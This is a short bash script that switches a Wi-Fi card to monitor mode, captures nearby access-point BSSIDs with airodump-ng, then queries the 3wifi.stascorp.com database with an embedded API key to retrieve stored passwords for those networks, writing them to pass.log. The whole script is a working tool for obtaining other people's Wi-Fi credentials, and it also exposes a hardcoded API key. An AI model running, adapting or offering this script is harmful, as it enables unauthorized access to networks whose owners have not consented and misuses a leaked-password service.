#!/bin/bash
COUNTER=0

	while read -r line ; do
		DEVS[$COUNTER]=$line
		COUNTER=$((COUNTER+1))
	done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")


	if [[ ${#DEVS[@]} == 0 ]]; then
		exit		
	fi

	if [[ ${#DEVS[@]} == 1 ]]; then
		wlan=${DEVS[0]}
	fi

	if [[ ${#DEVS[@]} -gt 1 ]]; then
		COUNTER=0
		for i in "${DEVS[@]}";
		do
			echo "$((COUNTER+1)). ${DEVS[COUNTER]}"
			COUNTER=$((COUNTER+1))
		done
		read -p "" INTNUM	
		wlan=${DEVS[$((INTNUM-1))]}	
	fi

sudo ip link set "$wlan" down && sudo iw "$wlan" set monitor control && sudo ip link set "$wlan" up

sudo airodump-ng -i $wlan -w openwifinetworks --output-forma csv

	sudo rm openwifinetworks-01.ivs

cat openwifinetworks-01.csv | grep  -o '..:..:..:..:..:..' > bssid.txt

	sudo rm openwifinetworks-01.csv

sudo ip link set "$wlan" down && sudo iw "$wlan" set type managed && sudo ip link set "$wlan" up

while read bssid
 do curl "http://3wifi.stascorp.com/api/ajax.php?Query=Find&Key=MHgONUzVP0KK3FGfV0HVEREHLsS6odc3&BSSID=$bssid&Version=0.5" | awk -F'[,]' '{print $2,$3}' >> pass.txt
 done < bssid.txt 

 paste bssid.txt pass.txt > pass.log 

	
	sudo rm bssid.txt
	sudo rm pass.txt
clear

cat pass.log
